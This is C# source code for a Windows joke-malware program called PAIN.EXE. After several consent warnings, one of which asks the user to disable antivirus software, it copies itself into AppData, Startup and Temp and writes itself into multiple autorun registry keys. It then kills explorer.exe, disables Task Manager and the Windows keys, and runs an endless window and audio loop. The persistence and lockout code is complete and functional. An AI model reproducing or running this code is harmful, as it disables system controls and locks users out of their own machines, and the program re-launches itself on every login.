using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Reflection;
using System.Windows.Forms;
using PAIN.EXE.Properties;
using System.Threading;

namespace PAIN.EXE {
    static class Program {
        [STAThread]
        static void Main() {
            if (!File.Exists(Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Pain.exe"))) {
                #region Intro()
                if (MessageBox.Show("This software might make your machine unoperable!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                if (MessageBox.Show("This is the last warning! The author is not responsible for any damage this software causes!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                if (MessageBox.Show("This application contains flickering images!\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                if (MessageBox.Show("Executing this application requires antiviruses to be disabled.\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                if (MessageBox.Show("This application might require to be run as admin if your account has admin rights.\r\nDo you want to continue?", "PAIN.EXE", MessageBoxButtons.YesNo) != DialogResult.Yes)
                    Environment.Exit(0);
                #endregion
            }
            #region Persist()
            string ADPath = Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Pain.exe");
            string TMPath = Combine(Path.GetTempPath(), @"Pain.exe");
            RefreshFile(Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), @"Pain.exe"));
            if (RefreshFile(ADPath)) {
                Process.Start(ADPath);
                Environment.Exit(0);
            }
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PainAppData", ADPath);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainAppData", ADPath);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainAppData", ADPath);
            RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainAppData", ADPath);
            RefreshFile(TMPath);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "PainTemp", TMPath);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "PainTemp", TMPath);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "PainTemp", TMPath);
            RefreshReg(@"SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Windows\load", "PainTemp", TMPath);
            
            Process.Start("cmd.exe", "/c \"taskkill /f /im explorer.exe\"");
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1);
            RefreshReg(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1);
            #endregion
            #region Check()
            Thread.Sleep(new Random(new Random().Next(100, 999)).Next(0, 500));
            if (Process.GetProcessesByName("Pain").Length > 1)
                Environment.Exit(0);
            #endregion
            #region Start()
            Thread t = new Thread(new ThreadStart(Audio));
            t.Start();
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            while (true) {
                Application.Run(new Form1());
            }
        }

        public static string Combine(string part1, string part2) {
            string p1t = "";
            string p2t = "";
            if (part1.EndsWith(@"\"))
                p1t = part1.Remove(part1.Length - 1);
            else
                p1t = part1;
            if (part2.StartsWith(@"\"))
                p2t = part2.Remove(0);
            else
                p2t = part2;
            return p1t + @"\" + p2t;
        }

        public static void Audio() {
            SoundPlayer soundPlayer = null;
            while (true) {
                if (soundPlayer != null) {
                    soundPlayer.Stop();
                    soundPlayer.Dispose();
                }
                soundPlayer = new SoundPlayer(Resources.hava_nagila);
                soundPlayer.PlayLooping();
                Thread.Sleep(341000);
            }
            #endregion
        }
        #region Define(Persist)
        public static bool RefreshFile(string FilePath) {
            try {
                if (File.Exists(FilePath))
                    return false;
                File.Copy(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath, FilePath);
                return true;
            } catch { return false; }
        }

        public static void RefreshReg(string HKCUKey, string ValueName, object Value) {
            try {
                Registry.CurrentUser.OpenSubKey(HKCUKey, false).GetValue(ValueName);
            } catch { try {
                    Registry.CurrentUser.CreateSubKey(HKCUKey);
                } catch { }
            } try {
                if (Registry.CurrentUser.OpenSubKey(HKCUKey, false).GetValue(ValueName) != null)
                    return;
                Registry.CurrentUser.OpenSubKey(HKCUKey, true).SetValue(ValueName, Value);
            } catch { }
        }
        #endregion
    }
}
